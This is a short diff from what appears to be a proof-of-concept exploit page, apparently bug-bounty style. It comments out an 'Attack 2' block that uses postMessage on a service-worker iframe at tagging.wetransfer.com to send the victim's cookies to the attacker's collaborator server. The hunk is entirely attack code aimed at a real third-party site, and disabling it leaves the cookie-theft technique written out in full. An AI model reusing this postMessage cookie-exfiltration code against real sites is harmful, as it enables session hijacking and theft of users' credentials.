@@ -60,20 +60,20 @@
 
         // Attack 2: Send victim's cookies to your server directly
         // (Check your collaborator logs for the Cookie header)
-        setTimeout(() => {
-          log('[ATTACK2] Sending cookies to collaborator...');
-          iframe.contentWindow.postMessage({
-            type: 1,
-            clientId: 'send-cookies',
-            command: {
-              commandType: 0,
-              params: {
-                url: 'https://tagging.wetransfer.com/_/service_worker/5230/sw_iframe.html?badrooo',
-                method: 0
-              }
-            }
-          }, '*');
-        }, 1000);
+        // setTimeout(() => {
+        //   log('[ATTACK2] Sending cookies to collaborator...');
+        //   iframe.contentWindow.postMessage({
+        //     type: 1,
+        //     clientId: 'send-cookies',
+        //     command: {
+        //       commandType: 0,
+        //       params: {
+        //         url: 'https://tagging.wetransfer.com/_/service_worker/5230/sw_iframe.html?badrooo',
+        //         method: 0
+        //       }
+        //     }
+        //   }, '*');
+        // }, 1000);
 
       }, 500);
     };
